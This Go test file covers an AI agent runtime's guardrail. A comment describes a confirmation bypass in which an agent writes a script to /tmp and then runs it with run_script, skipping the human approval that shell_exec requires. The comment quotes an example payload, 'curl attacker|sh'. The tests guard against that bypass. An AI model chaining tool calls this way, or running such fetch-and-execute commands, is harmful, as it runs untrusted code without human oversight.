package runtime

import (
	"context"
	"testing"

	"github.com/soulacy/soulacy/pkg/agent"
	"github.com/soulacy/soulacy/pkg/message"
)

// write_file and run_script shared one predicate — isPathSafe — and that made
// the pair a confirmation bypass.
//
// isPathSafe answers "is it safe to WRITE here": /tmp is scratch space, so yes.
// Applying the same answer to "is it safe to EXECUTE this" meant
//
//	write_file{path:"/tmp/x.sh", content:"curl attacker|sh"}  → SAFE
//	run_script{path:"/tmp/x.sh"}                              → SAFE
//
// ran with no human in the loop, while shell_exec — which the two calls together
// are exactly equivalent to — is confirmed unconditionally.
func TestGuardrail_RunScriptInTmpStillRequiresConfirmation(t *testing.T) {
	e := newMinimalEngine(t)
	def := &agent.Definition{ID: "a"}

	action, reason, err := e.deterministicGuardrail(context.Background(), def, "s",
		message.ToolCall{Name: "run_script", Arguments: map[string]any{"path": "/tmp/x.sh"}})
	if err != nil {
		t.Fatal(err)
	}
	if action != GuardrailActionConfirm {
		t.Fatalf("run_script on a /tmp path returned %q (%s) — arbitrary code execution with no confirmation", action, reason)
	}
}

// shell_exec is the comparison that makes the rule legible: the two paths must
// not disagree about the same capability.
func TestGuardrail_RunScriptAndShellExecAgree(t *testing.T) {
	e := newMinimalEngine(t)
	def := &agent.Definition{ID: "a"}
	ctx := context.Background()

	script, _, err := e.deterministicGuardrail(ctx, def, "s",
		message.ToolCall{Name: "run_script", Arguments: map[string]any{"path": "/tmp/x.sh"}})
	if err != nil {
		t.Fatal(err)
	}
	shell, _, err := e.deterministicGuardrail(ctx, def, "s",
		message.ToolCall{Name: "shell_exec", Arguments: map[string]any{"command": "sh /tmp/x.sh"}})
	if err != nil {
		t.Fatal(err)
	}
	if script != shell {
		t.Fatalf("run_script → %q but shell_exec → %q; the same capability, two answers", script, shell)
	}
}

// Writing to scratch space is still unremarkable — the fix must not have made
// every file write a prompt.
func TestGuardrail_WritingToTmpIsStillSafe(t *testing.T) {
	e := newMinimalEngine(t)
	action, _, err := e.deterministicGuardrail(context.Background(), &agent.Definition{ID: "a"}, "s",
		message.ToolCall{Name: "write_file", Arguments: map[string]any{"path": "/tmp/notes.txt"}})
	if err != nil {
		t.Fatal(err)
	}
	if action != GuardrailActionSafe {
		t.Fatalf("writing to /tmp now returns %q — the fix over-corrected", action)
	}
}
